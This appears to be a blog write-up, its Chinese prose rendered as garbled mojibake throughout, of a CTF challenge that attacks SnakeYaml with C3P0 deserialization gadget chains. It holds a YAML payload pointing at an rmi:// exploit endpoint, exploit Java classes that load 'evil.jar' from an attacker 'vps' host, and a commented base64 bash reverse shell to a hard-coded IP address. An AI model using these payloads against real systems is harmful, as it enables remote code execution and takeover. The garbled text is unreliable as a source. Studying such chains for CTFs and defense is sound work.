align="left">JavaåŸç”Ÿååºåˆ—åŒ–ä¸å‡ºç½‘</td></tr></tbody></table><p>åœ¨ä¸è€ƒè™‘é¢˜ç›®é»‘åå•çš„æƒ…å†µä¸‹ï¼Œè¿™é‡Œæµ…æµ…äº†è§£äº†ä¸€ä¸‹C3P0çš„å‡ ç§æ‰“æ³•ï¼š</p><h3 id="JndiRefForwardingDataSourceï¼šJndi-æ³¨å…¥"><a href="#JndiRefForwardingDataSourceï¼šJndi-æ³¨å…¥" class="headerlink" title="JndiRefForwardingDataSourceï¼šJndi æ³¨å…¥"></a>JndiRefForwardingDataSourceï¼šJndi æ³¨å…¥</h3><p>æ²¡é”™ï¼Œåˆæ˜¯è€å¸¸å®¢äº†ï¼ŒJNDIæ³¨å…¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.JndiRefForwardingDataSource#setLoginTimeout(<span class="hljs-type">int</span> seconds) å¯ä»¥è§¦å‘ jndi æ³¨å…¥<br></code></pre></td></tr></table></figure><p>pocé“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.JndiRefForwardingDataSource#setLoginTimeout(<span class="hljs-type">int</span> seconds)<br> -com.mchange.v2.c3p0.JndiRefForwardingDataSource#inner()<br>   -com.mchange.v2.c3p0.JndiRefForwardingDataSource#dereference()<br>     -InitialContext#lookup()<br></code></pre></td></tr></table></figure><p>è€ŒSnakeYaml å¯ä»¥è§¦å‘è¯¥ setter æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">poc_snakeyaml</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n jndiName: \&quot;rmi://127.0.0.1:1234/Exploit\&quot;\n loginTimeout: 0&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="WrapperConnectionPoolDataSourceï¼šHex-äºŒæ¬¡ååºåˆ—åŒ–"><a href="#WrapperConnectionPoolDataSourceï¼šHex-äºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="WrapperConnectionPoolDataSourceï¼šHex äºŒæ¬¡ååºåˆ—åŒ–"></a>WrapperConnectionPoolDataSourceï¼šHex äºŒæ¬¡ååºåˆ—åŒ–</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource &#123;userOverridesAsString: \&quot;HexAsciiSerializedMap:&quot;</span> +hexAscii+ <span class="hljs-string">&quot;;\&quot;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆ SnakeYaml å¯ä»¥è§¦å‘ Hex äºŒæ¬¡ååºåˆ—åŒ–è¿™æ¡é“¾å­ï¼Ÿ</p><p>é¦–å…ˆ SnakeYaml åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šæ ¹æ® yaml ä¸­çš„ç±»å±æ€§æè¿°è¿›è¡Œç›¸å…³ setter æ–¹æ³•å¹¶è°ƒç”¨ï¼š</p><p>WrapperConnectionPoolDataSourceBase æ˜¯ WrapperConnectionPoolDataSourceçš„çˆ¶ç±»ï¼Œè€Œ<code>com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase#setUserOverridesAsString</code>åœ¨ snakeyaml ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¢«è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserOverridesAsString</span><span class="hljs-params">( String userOverridesAsString )</span> <span class="hljs-keyword">throws</span> PropertyVetoException<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">oldVal</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.userOverridesAsString;<br>    <span class="hljs-keyword">if</span> ( ! eqOrBothNull( oldVal, userOverridesAsString ) )<br>        vcs.fireVetoableChange( <span class="hljs-string">&quot;userOverridesAsString&quot;</span>, oldVal, userOverridesAsString );<br>    <span class="hljs-built_in">this</span>.userOverridesAsString = userOverridesAsString;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»è¿‡ä¸€ç³»åˆ—è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">java.beans.VetoableChangeSupport#fireVetoableChange(String propertyName, Object oldValue, Object newValue)<br>    -java.beans.VetoableChangeSupport#fireVetoableChange(PropertyChangeEvent event)<br>      -java.beans.VetoableChangeListener#vetoableChange()<br>        -C3P0ImplUtils#parseUserOverridesAsString()<br>          -com.mchange.v2.ser.SerializableUtils#fromByteArray(<span class="hljs-type">byte</span>[] bytes)<br>            -com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray(<span class="hljs-type">byte</span>[] bytes)<br></code></pre></td></tr></table></figure><p><code>C3P0ImplUtils#parseUserOverridesAsString</code>æ–¹æ³•ï¼šä»å½¢å‚å¤„æˆªå–æ‰HASM_HEADERï¼š<code>HexAsciiSerializedMap</code>å­—ç¬¦ä¸²ç„¶åè¿›è¡Œhexè§£ç ä¸ºå­—èŠ‚æ•°ç»„ï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010542985.png" alt="image-20240805010542985"></p><p>ä¸‹ä¸€ä¸ªæ ˆè°ƒç”¨<code>com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray(byte[] bytes)</code>å¤„ç†å­—èŠ‚æ•°ç»„è°ƒç”¨åŸç”Ÿååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserializeFromByteArray</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>    <span class="hljs-keyword">return</span> in.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObjectï¼šjndi-æ³¨å…¥"><a href="#com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObjectï¼šjndi-æ³¨å…¥" class="headerlink" title="com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObjectï¼šjndi æ³¨å…¥"></a>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObjectï¼šjndi æ³¨å…¥</h3><p>å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()<br>  -IndirectlySerialized#getObject()<br>  -com.mchange.v2.naming.ReferenceIndirector#getObject()<br>    -InitialContext#lookup()<br></code></pre></td></tr></table></figure><p><code>com.mchange.v2.naming.ReferenceIndirector#getObject()</code> å†…éƒ¨å¯ä»¥è§¦å‘ JNDI æ³¨å…¥ï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010609440.png" alt="image-20240805010609440"></p><p>çœ‹åˆ°lookupåŸºæœ¬å°±æœ‰è°±äº†ã€‚</p><h3 id="com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObjectï¼šè¿œç¨‹ç±»åŠ è½½"><a href="#com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObjectï¼šè¿œç¨‹ç±»åŠ è½½" class="headerlink" title="com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObjectï¼šè¿œç¨‹ç±»åŠ è½½"></a>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObjectï¼šè¿œç¨‹ç±»åŠ è½½</h3><p>åˆ©ç”¨é“¾å¯å‚è€ƒysoserialï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()<br>  -IndirectlySerialized#getObject()<br>  -com.mchange.v2.naming.ReferenceIndirector#getObject()<br>    -com.mchange.v2.naming.ReferenceableUtils#referenceToObject(Reference ref,Name name,Context nameCtx,Hashtable env)<br>     -URLClassLoader<br></code></pre></td></tr></table></figure><p>å¯¹äºæœ€åä¸€æ­¥<code>com.mchange.v2.naming.ReferenceableUtils#referenceToObject(Reference ref,Name name,Context nameCtx,Hashtable env)</code></p><p>è¿™é‡Œä¼šè·å–é€šè¿‡ URLClassLoader æ¥åŠ è½½è¿œç¨‹çš„ç±»å¹¶è¿›è¡Œåˆå§‹åŒ–å’Œ getObjectInstance æ–¹æ³•çš„è°ƒç”¨ï¼Œ</p><p>å› æ­¤å¯ä»¥ç›´æ¥åœ¨é™æ€å—é‡Œé¢æ”¾å…¥æ¶æ„æ•°æ®è¿›è¡ŒRCEï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010633303.png" alt="image-20240805010633303"></p><p>å¯¹äºå‰é¢ä¸€ä¸ªjndiä¹Ÿæœ‰çš„PoolBackedDataSourceBaseï¼Œè¿™é‡Œä¸€å¹¶è®²äº†ã€‚</p><p>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()ï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010651598.png" alt="image-20240805010651598"></p><p>çº¢æ¡†ä¸­çš„ <code>ois.readObject()</code> è·å–çš„æ˜¯ IndirectlySerialized å¯¹è±¡ï¼ŒIndirectlySerialized æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…¶çš„å”¯ä¸€å­ç±»æ˜¯ ReferenceSerializedï¼Œ</p><p>ä½†æ˜¯ ReferenceSerialized æ˜¯ ReferenceIndirector ç±»å†…éƒ¨çš„ç§æœ‰ç±»ï¼Œè¯¥ç±»ä¸èƒ½è¿›è¡Œåˆå§‹åŒ–æ“ä½œã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬ç°åœ¨è¦çœ‹ writeObject æ˜¯å¦‚ä½•å°† ReferenceSerialized å†™å…¥åˆ°åºåˆ—åŒ–æµä¸­çš„ã€‚</p><p>ä»åºåˆ—åŒ–è§’åº¦æ¥çœ‹ï¼š</p><p><code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#writeObject()</code> ä¸­ï¼Œ</p><p>å¦‚æœåºåˆ—åŒ–çš„ç±»æ˜¯ä¸å¯åºåˆ—åŒ–çš„è¯(NotSerializableException)ï¼Œå°†ä¼šåœ¨ catch å—ä¸­å¯¹ connectionPoolDataSource å±æ€§ç”¨ ReferenceIndirector.indirectForm æ–¹æ³•å¤„ç†åå†è¿›è¡Œåºåˆ—åŒ–æ“ä½œã€‚(connectionPoolDataSource å±æ€§æ˜¯ ConnectionPoolDataSource ç±»çš„å®ä¾‹)</p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010709621.png" class="" title="image-20240805010709621"><p><code>ReferenceIndirector.indirectForm</code> æ–¹æ³•ä¸­ä¼šå–å‡ºå‚æ•° ConnectionPoolDataSource å®ä¾‹ä¸­çš„ Reference å¯¹è±¡å¹¶æ„é€ å‡ºå¯åºåˆ—åŒ–çš„ <code>ReferenceSerialized</code> å¯¹è±¡å¹¶è¿”å›ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> IndirectlySerialized <span class="hljs-title function_">indirectForm</span><span class="hljs-params">( Object orig )</span> <span class="hljs-keyword">throws</span> Exception<br>&#123; <br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> ((Referenceable) orig).getReference();<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceSerialized</span>( ref, name, contextName, environmentProperties );<br>&#125;<br>ReferenceSerialized( Reference   reference,<br>                    Name        name,<br>                    Name        contextName,<br>                    Hashtable   env )<br>&#123;<br>    <span class="hljs-built_in">this</span>.reference = reference;<br>    <span class="hljs-built_in">this</span>.name = name;<br>    <span class="hljs-built_in">this</span>.contextName = contextName;<br>    <span class="hljs-built_in">this</span>.env = env;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦åºåˆ—åŒ–ä¸€ä¸ªæ²¡æœ‰å®ç° Serializable æ¥å£çš„ ConnectionPoolDataSource çš„å®ä¾‹æ‰èƒ½å°† IndirectlySerialized å†™å…¥åˆ°åºåˆ—åŒ–æµä¸­ã€‚</strong></p><p>ConnectionPoolDataSource æ¥å£æœ‰ä¿©ä¸ªå­ç±»ï¼Œä¸è¿‡é—æ†¾çš„æ˜¯å®ƒä»¬ä¿©éƒ½å¯ä»¥è¢«åºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">WrapperConnectionPoolDataSource<br>JndiRefConnectionPoolDataSource<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆåªèƒ½è‡ªå·±å†™ä¸€ä¸ªå®ç° ConnectionPoolDataSource æ¥å£çš„ç±»ä½†æ˜¯ä¸å¯è¢«åºåˆ—åŒ–çš„ç±»ï¼Œä¹Ÿå…³ç³»åˆ°è¿™ä¸ªé¢˜çš„expï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0DataSource</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;http://vps:port/evil.jar&quot;</span>);<br>        <span class="hljs-keyword">return</span> reference;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObjectï¼šBeanFactoryä¸å‡ºç½‘"><a href="#com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObjectï¼šBeanFactoryä¸å‡ºç½‘" class="headerlink" title="com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObjectï¼šBeanFactoryä¸å‡ºç½‘"></a>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObjectï¼šBeanFactoryä¸å‡ºç½‘</h3><p><a href="https://www.yulegeyu.com/2021/10/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/">JAVAååºåˆ—åŒ–ä¹‹C3P0ä¸å‡ºç½‘åˆ©ç”¨</a> å’Œ JNDI é«˜ç‰ˆæœ¬æ³¨å…¥å¾ˆåƒã€‚</p><p>å…³äºJNDIé«˜ç‰ˆæœ¬æ³¨å…¥ï¼Œè¿™ä¸ªæˆ‘åœ¨ä¹‹å‰çš„åšå®¢å°±åˆ†æäº†ï¼š<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943">ç»•è¿‡JDKé«˜ç‰ˆæœ¬é™åˆ¶è¿›è¡ŒJNDIæ³¨å…¥ - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>è¨€å½’æ­£ä¼ ï¼Œå›åˆ°æ€ä¹ˆæ‰“é¢˜ç›®æœ¬èº«ã€‚</p><p>é¢˜ç›®å…¥å£æ˜¯ yaml.loadï¼Œè¿˜ç»™äº† C3P0 ä¾èµ–ï¼Œåˆè¿‡æ»¤äº† jndi ä¹‹ç±»çš„å…³é”®å­—ï¼Œæ‰€ä»¥èƒ½æƒ³åˆ°è‚¯å®šæ˜¯ <strong>SnakeYaml + C3P0 çš„ HEX äºŒæ¬¡ååºåˆ—åŒ–</strong>ã€‚</p><p>æ ¹æ®ä¸Šé¢çš„ 5 æ¡ C3P0 åˆ©ç”¨é“¾ï¼Œé€‰æ‹© SnakeYaml ååºåˆ—åŒ–è§¦å‘åŸç”Ÿååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">WrapperConnectionPoolDataSource#setUserOverridesAsString --&gt; ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><p>ç„¶åå†è§¦å‘è¿œç¨‹ç±»åŠ è½½æˆ–è€…jndiæ³¨å…¥:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject --&gt; IndirectlySerialized#getObject() --&gt; InitialContext#lookup<br>or<br>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject --&gt; IndirectlySerialized#getObject() --&gt; com.mchange.v2.naming.ReferenceableUtils#referenceToObject --&gt; URLClassLoader<br></code></pre></td></tr></table></figure><p>å€Ÿç”¨åŸä½œè€… URLClassLoader è¿œç¨‹åŠ è½½ç±»POCç›´æ¥æ‰“äº†ã€‚</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805003817800.png" alt="image-20240805003817800"></p><p>å…¥å£å¾ˆæ˜¾ç„¶åœ¨è¿™ä¸ªyaml.loadï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ–¹æ³•æ˜¯C3P0çš„HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨ï¼ŒSnakeYamlå°±èµ·åˆ°ä¸€ä¸ªè°ƒç”¨<code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</code>çš„ä½œç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.snakeyaml;<br><br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;http://vps:port/&quot;</span>);<br><span class="hljs-comment">//            ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);</span><br><span class="hljs-comment">//            resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="hljs-comment">//            resourceRef.add(new StringRefAddr(&quot;x&quot;, &quot;Runtime.getRuntime().exec(&#x27;bash -c \&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMjkuMTcwLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#x27;)&quot;));</span><br><span class="hljs-comment">//            return resourceRef;</span><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span 